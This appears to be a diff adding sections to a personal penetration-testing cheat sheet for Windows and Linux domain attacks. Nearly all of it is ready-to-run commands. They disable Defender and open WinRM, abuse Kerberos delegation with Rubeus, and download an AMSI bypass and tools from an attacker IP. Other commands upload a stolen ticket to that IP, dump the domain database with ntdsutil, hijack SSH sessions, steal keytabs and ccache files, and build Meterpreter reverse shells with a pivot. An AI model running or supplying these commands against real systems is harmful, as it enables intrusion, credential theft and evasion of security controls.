@@ -711,10 +711,23 @@ Execute with InstallUtil:
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U \\192.168.45.218\pwn\assembly.exe
 ```
 ---
-### Ansible Abuse
+### Port Forward
+```cmd
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=192.168.58.128 connectport=8080 connectaddress=192.168.57.140
+netsh advfirewall firewall add rule name="PortForwarding 8080" dir=in action=allow protocol=TCP localport=8080
+netsh advfirewall firewall add rule name="PortForwarding 8080" dir=out action=allow protocol=TCP localport=8080
+```
 
 ## Persistence
+### Disable AV
+```powershell
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+```
 
+### Enable WinRM
+```
+Enable-PSRemoting -Force;Set-Item wsman:\localhost\client\trustedhosts *
+```
 ## Privesc
 ### DNSADMINS group
 ```powershell
@@ -743,7 +756,53 @@ create
 expose %cdrive% E:
 end backup
 ```
+
+### Constrained Delegation
+svc_sql user has constrained delegation for SPN "time/M3WEBAW.M3C.LOCAL" for host m3webaw. That means we can impersonate any user on that host for that SPN, however, we can edit the SPN to use any service such as ldap, rpscss, host, wsman, etc.
+To exploit it, we can do the following.
+First, get base64 encoded ticket for the svc_sql user.
+```
+./rubeus.exe tgtdeleg /nowrap
+```
+Now, we can use Rubeus to get TGS for IT Admins user in M3WEBAW.
+```
+./rubeus.exe s4u /impersonateuser:LORRAINE.MCDONALD /ptt /altservice:http,rpcss,host,wsman,ldap,cifs /msdsspn:"time/M3WEBAW.M3C.LOCAL" /ticket:<base64 ticket>
+```
+Finally, we can just use PSRemote to get into M3WEBAW with our TGS tickets.
+```
+Enter-PSSession -ComputerName M3WEBAW.M3C.LOCAL
+```
+
+### Resource Based Constrained Delegation (genericWrite over host)
+Some pre-requirements:
+```powershell
+iwr http://10.10.15.51:8080/Rubeus.exe -o rubeus.exe
+#AMSI Bypass
+IEX(New-Object Net.WebClient).downloadString("http://10.10.15.51:8080/bypass.ms1")
+IEX(New-Object Net.WebClient).downloadString("http://10.10.15.51:8080/PowerView.ps1")
+IEX(New-Object Net.WebClient).downloadString("http://10.10.15.51:8080/Powermad.ps1")
+```
+
+RBCD Attack:
+```powershell
+New-MachineAccount -MachineAccount attackersyste -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+$ComputerSid = Get-DomainComputer attackersyste -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer m3dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+./rubeus.exe hash /password:Summer2018! /domain:m3c.local /user:attackersyste$
+./rubeus.exe s4u /user:attackersyste$ /aes256:FB0E89A034E9FCCF80298ACBB79BF7D866B44FA9D3A222C568A6EC6F2D8103AA /impersonateuser:JOHN.CLARK /msdsspn:ldap/M3DC.m3c.local /ptt
+./rubeus.exe dump /nowrap
+[IO.File]::WriteAllBytes("C:\users\svc_apache\desktop\ldap.kirbi", [Convert]::FromBase64String("<b64ticket>"))
+Invoke-WebRequest -uri http://10.10.15.51:8080/ldap.kirbi -Method Put -Infile ldap.kirbi -ContentType 'application/binary'
+```
 ## Credential Access
+### Local DCSYNC
+```
+ntdsutil.exe 'ac i ntds' 'ifm' 'create full $env:TEMP' q q
+```
+
 
 ## Lateral Movement
 ### WinRM
@@ -758,6 +817,127 @@ Invoke-Command -Computer DC-1 -Credential $cred -ScriptBlock { systeminfo }
 \\live.sysinternals.com\tools\PsExec64.exe -accepteula \\victim.domain.com powershell.exe
 ```
 ---
+### SSH ControlMaster Hijacking
+1. Create file ```~/.ssh/config``` with content:
+```
+Host *
+        ControlPath ~/.ssh/controlmaster/%r@%h:%p
+        ControlMaster auto
+        ControlPersist 10m
+```
+2. ```chmod 644 ~/.ssh/config```
+
+3. Create folder ```~/.ssh/controlmaster```
+
+4. If you are root, you can now do:
+```bash
+ssh -S /home/victim/.ssh/controlmaster/victim\@linuxvictim\:22 victim@linuxvictim
+```
+5. Otherwise, just use ssh normally without pass if you are logged in as the user with controlmaster hijacking activated.
+---
+### Ansible Abuse
+Enumerate hosts from controller:
+```bash
+cat /etc/ansible/hosts
+```
+
+Execute command:
+```bash
+ansible victims -a "whoami"
+ansible victims -a "whoami" --become # as root or the user appended after become arg
+```
+
+Example playbook with credentials stored:
+```
+---
+- name: test
+  hosts: all
+  gather_facts: true
+  become: yes
+  become_user: testuser
+  vars:
+    ansible_become_pass: testpass
+  tasks:
+    - copy:
+          content: "testings"
+          dest: "/home/testuser/written_by_ansible.txt"
+          mode: 0644
+          owner: testuser
+          group: testuser
+```
+
+Execute playbook:
+```bash
+ansible-playbook writefile.yaml
+```
+
+If ansible playbook has hashes pass, convert to john with:
+```bash
+python3 /usr/share/john/ansible2john.py ./test.yml
+```
+
+If you have the privs, also possible to decrypt directly with:
+```
+cat pw.txt | ansible-vault decrypt # pw.txt contais only the hashed pass, not the full playbook
+```
+
+### Linux Kerberos Exp
+Steal keytab file if you are root:
+```bash
+kinit administrator@evil.corp -k -t /tmp/administrator.keytab
+```
+
+If the tickets are expired:
+```bash
+kinit -R
+```
+
+Smbclient with kerberos:
+```bash
+smbclient -k -U "evil.corp\administrator" //DC.evil.corp/C$
+```
+
+Hijack ccache files:
+```bash
+sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
+sudo chown hackermen:hackermen /tmp/krb5cc_minenow
+export KRB5CCNAME=/tmp/krb5cc_minenow
+```
+## Command and Control
+### Meterpreter
+Gen payload:
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.241 LPORT=4444 --encoder x64/zutto_dekiru --format psh
+```
+
+Start listener:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 4444
+run
+```
+
+Socks proxy:
+```
+use post/multi/manage/autoroute
+set SUBNET 172.16.224.1/24
+set SESSION 1
+run
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+run
+```
+
+Privesc:
+```
+search windows local
+use exploit/windows/local/cve_2022_21882_win32k
+set LHOST tun0
+set SESSION 1
+run
+```
 ## Exfiltration
 ### With simple HTTP server
 Server-side python code:
